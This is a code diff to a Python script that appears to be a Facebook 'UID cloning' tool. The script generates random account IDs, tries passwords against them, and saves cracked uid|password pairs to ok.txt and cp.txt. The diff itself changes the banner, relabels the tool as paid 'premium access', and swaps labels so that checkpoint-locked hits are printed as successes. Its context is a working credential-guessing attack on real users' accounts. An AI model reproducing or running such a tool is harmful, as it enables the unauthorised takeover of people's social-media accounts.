@@ -56,32 +56,29 @@ class Main:
 		os.system("clear")
 		
 		print ("""\033[1;92m 
-
-
- \033[1;92m /$$      /$$  /$$$$$$  /$$   /$$  /$$$$$$  /$$$$$$$  /$$$$$$
-| $$$    /$$$ /$$__  $$| $$  | $$ /$$__  $$| $$__  $$|_  $$_/
-| $$$$  /$$$$|__/  \ $$| $$  | $$|__/  \ $$| $$  \ $$  | $$  
-| $$ $$/$$ $$   /$$$$$/| $$$$$$$$   /$$$$$/| $$  | $$  | $$  
-| $$  $$$| $$  |___  $$| $$__  $$  |___  $$| $$  | $$  | $$  
-| $$\  $ | $$ /$$  \ $$| $$  | $$ /$$  \ $$| $$  | $$  | $$  
-| $$ \/  | $$|  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$/ /$$$$$$
-|__/     |__/ \______/ |__/  |__/ \______/ |_______/ |______/
-                                                             
-                                                            
-                                                                                                               
-                                                                                
+		
+ \033[91;1m 
+'##::::'##:'########:'##::::'##:'########:'########::'####:
+ ###::'###: ##.....:: ##:::: ##: ##.....:: ##.... ##:. ##::
+ ####'####: ##::::::: ##:::: ##: ##::::::: ##:::: ##:: ##::
+ ## ### ##: ######::: #########: ######::: ##:::: ##:: ##::
+ ##. #: ##: ##...:::: ##.... ##: ##...:::: ##:::: ##:: ##::
+ ##:.:: ##: ##::::::: ##:::: ##: ##::::::: ##:::: ##:: ##::
+ ##:::: ##: ########: ##:::: ##: ########: ########::'####:
+..:::::..::........::..:::::..::........::........:::....::
+                                                                                                            
 \033[1;90m══════════════════════════════════════════════════
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mFACEBOOK : M3H3DI HASAN
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mGITHUB   : h4s49
 \033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mWARNING  : IT CAN BE Ok or Cp
-\033[1;91m [\033[1;94m✯\033[1;91m] \033[0;91mTIP: Login With DATA By Clearing The Fb Lite apk Or Direct Login In Official Fb app
+\033[1;91m [\033[1;94m✯\033[1;91m] \033[1;92mTIP: Login With DATA By Clearing The Fb Lite apk Or Direct Login In Official Fb app
 \033[1;90m══════════════════════════════════════════════════
     """)
 		print("%s [%s•%s] %sTOOL NAME : %s2009 Cloning"%(G,R,G,B,G))
-		print("%s [%s•%s] %sVERSION   : %s1.1"%(G,R,G,B,G))
+		print("%s [%s•%s] %sSTATUS   : %sPREMIUM ACCESS"%(G,R,G,B,G))
 		print("")
-		print("\n    \033[0;92m            UID🔥 CLONING🔥 \033[0;97m ")
-		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(FREE)"%(G,R,G,Y,B))
+		print("\n    \033[92;1m            UID CLONER \033[0;97m ")
+		print("%s [%s1%s]%s CRACK RANDOM FB ID 2008-11 {JUST NOW} %s(PAID)"%(G,R,G,Y,B))
 		tanya = input("    \033[0;91m(#)\033[0;92m CHOOSE : ")
 		if tanya in ["", " "]:
 			Main()
@@ -92,7 +89,7 @@ class Main:
 		x = 111111111
 		xx = 999999999
 		idx = "100000" 
-		limit = int(input("    \033[0;91m[+]\033[0;92m TOTAL IDS TO CRACK (LIMIT 50000): "))
+		limit = int(input("    \033[0;91m[+]\033[0;31m TOTAL IDS TO CRACK (LIMIT 50000): "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -120,7 +117,7 @@ class Main:
 			"Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"
 		])
 		sys.stdout.write(
-			"\r\r %s[>_] [H4S49] : %s/%s -> \033[0;92m [ H4S497-OK:%s ]- \033[0;91m[M3H3DI-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
+			"\r\r %s[>_] [H4S49] : %s/%s -> \033[0;31m [ H4S497-CP:%s ]- \033[1;92m[M3H3DI-OK.%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
 		); sys.stdout.flush()
 		for pw in pwx:
 			pw = pw.lower()
@@ -142,7 +139,7 @@ class Main:
 				open("ok.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
 			elif "www.facebook.com" in response.json()["error_msg"]:
-				print("\r  \033[0;91m   [H4S49-CP] %s | %s\033[0;97m         "%(uid, pw))
+				print("\r  \033[1;92m   [H4S49-OK] %s | %s\033[0;97m         "%(uid, pw))
 				self.cp.append("%s|%s"%(uid, pw))
 				open("cp.txt","a").write("  * --> %s|%s\n"%(uid, pw))
 				break
